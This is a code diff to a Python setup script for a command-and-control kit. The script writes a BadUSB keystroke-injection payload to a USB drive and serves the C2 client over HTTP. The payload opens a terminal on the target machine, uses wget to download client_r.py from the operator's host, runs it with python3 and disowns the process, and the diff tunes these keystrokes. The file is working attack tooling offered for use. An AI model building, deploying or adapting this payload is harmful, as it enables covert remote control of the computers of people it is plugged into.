@@ -5,6 +5,7 @@ import re
 import http.server
 import subprocess
 import shutil
+import sys
 
 # Step 1: Replace IP_HOST in client.py with your local IP address
 client_py_path = os.path.join(os.path.dirname(__file__), "Base-C2/client.py")
@@ -33,40 +34,36 @@ with open(client_py_path, "w") as f:
     f.write(content_new)
 
 # change the payload of the badusb
-
-badusb_payload = """CTRL-ALT T
-DELAY 1000
+badusb_payload = f"""DEFAULT_DELAY 1
+GUI
+DELAY 300
+STRING terminal
+DELAY 300
+ENTER
+DELAY 500
 STRING (wget http://{local_ip}:8000/client_r.py -O /tmp/client_r.py && python3 /tmp/client_r.py) & disown; exit
 ENTER
 """
 
 print(badusb_payload)
-usb_mount_path = "/mnt/usb"
-# unmount the USB drive if it is already mounted
-def unmount_usb():
-    try:
-        subprocess.run(["umount", usb_mount_path], check=True)
-        print("[+] USB drive unmounted successfully.")
-    except subprocess.CalledProcessError:
-        print("[!] Failed to unmount USB drive. It may not be mounted.")
-unmount_usb()
+# take first argument as the USB mount path
+if len(sys.argv) < 2:
+    raise RuntimeError("Please provide the USB mount path as the first argument")
+
+usb_mount_path = sys.argv[1]
 # check if the usb is mounted
 if not os.path.exists(usb_mount_path):
-    os.makedirs(usb_mount_path)
-# Mount the USB drive if it is not already mounted
-def mount_usb():
-    try:
-        subprocess.run(["mount", "/dev/sda1", usb_mount_path], check=True)
-        print("[+] USB drive mounted successfully.")
-    except subprocess.CalledProcessError:
-        print("[!] Failed to mount USB drive. Make sure it is connected.")
-mount_usb()
+    raise RuntimeError(f"USB drive not found at {usb_mount_path}. Please ensure it is mounted.")
 
 # Write the badusb payload to the USB drive
 badusb_file_path = os.path.join(usb_mount_path, "payload.dd")
 with open(badusb_file_path, "w") as f:
     f.write(badusb_payload)
 
+# umount the USB drive
+#subprocess.run(["umount", usb_mount_path], check=True)
+subprocess.run(["umount", usb_mount_path], check=True)  # Ensure all writes are flushed to disk
+print(f"BadUSB payload written to {badusb_file_path}. Please safely remove the USB drive.")
 # Step 2: Serve only client.py via HTTP
 class SingleFileHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
     def list_directory(self, path):
@@ -76,7 +73,7 @@ class SingleFileHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
     def do_GET(self):
         if self.path == "/client_r.py":
             super().do_GET()
-            print("File retrieved, shutting down server...")
+            print("File retrieved, shutting down server...\n\n\n")
             # Shut down the server
             exit(0)
         else:
@@ -87,5 +84,5 @@ if __name__ == "__main__":
     PORT = 8000
     Handler = SingleFileHTTPRequestHandler
     with socketserver.TCPServer(("", PORT), Handler) as httpd:
-        print(f"Serving client_r.py at http://{local_ip}:{PORT}/client_r.py")
+        print(f"Serving client_r.py at http://{local_ip}:{PORT}/client_r.py\n")
         httpd.serve_forever()
